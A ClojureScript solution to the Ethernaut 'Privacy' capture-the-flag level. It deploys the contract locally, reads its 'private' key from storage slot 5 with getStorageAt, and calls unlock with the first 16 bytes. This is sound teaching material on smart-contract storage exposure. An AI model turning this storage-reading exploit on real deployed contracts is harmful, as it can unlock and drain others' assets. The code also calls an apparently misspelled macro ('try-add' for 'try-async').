(ns ctf.ethernaut.privacy
  "Like in the Vault Puzzle, we use getStorageAt to read
  the storage slots"
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]
            [cljs.core.async :as a]
            [cljs.core.async.interop :refer-macros [<p!]])
  (:require-macros [ctf.core :refer [try-async]]))


;; Init the a new wallet for the player
;; Attach it with the local provider
(def player
  (w/get-player! w/local-provider))


(def data
  "Fixed size array of 32bytes used as
  the argument for the constructor for the Privacy
  contract"
  (clj->js
   [(u/random-hex 32)
    (u/random-hex 32)
    (u/random-hex 32)]))


(defn deploy-privacy!
  "Deploys the Privacy contract using Owner's wallet!
   Returns the `js/Promise`."
  [data]
  (let [contract (u/contract
                  :privacy
                  w/local-wallet)]
    (.deploy contract data )))


(defn privacy-attack
  [data]
  (try-add
   [storage-slot 5
    privacy      (<p! (deploy-privacy! data))
    secret       (<p! (.getStorageAt
                       w/local-provider
                       (.-address privacy)
                       storage-slot))
    sliced       (.hexDataSlice
                  (.-utils u/ethers)
                  secret
                  0
                  16)]
   (do
     (<p! (.unlock privacy sliced))
     (<p! (.locked privacy)))))




(comment
  (u/compile-all!)

  ;; Execute this block to run the attack
  (a/take! (privacy-attack data) #(println %))


  (def privacy-contract (atom ""))
  (-> (deploy-privacy! data)
      (.then #(reset! privacy-contract %))
      (.catch #(.log js/console %)))


  (def secret (atom ""))



  (-> (.getStorageAt w/local-provider
                     (.-address @privacy-contract)
                     5)
      (.then #(reset! secret %))
      (.catch #(.log js/console %)))

  (-> (.unlock @privacy-contract
               (.hexDataSlice (.-utils u/ethers) @secret 0 16))
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  (-> (.locked @privacy-contract)
      (.then #(.log js/console  %))
      (.catch #(.log js/console %)))


  )
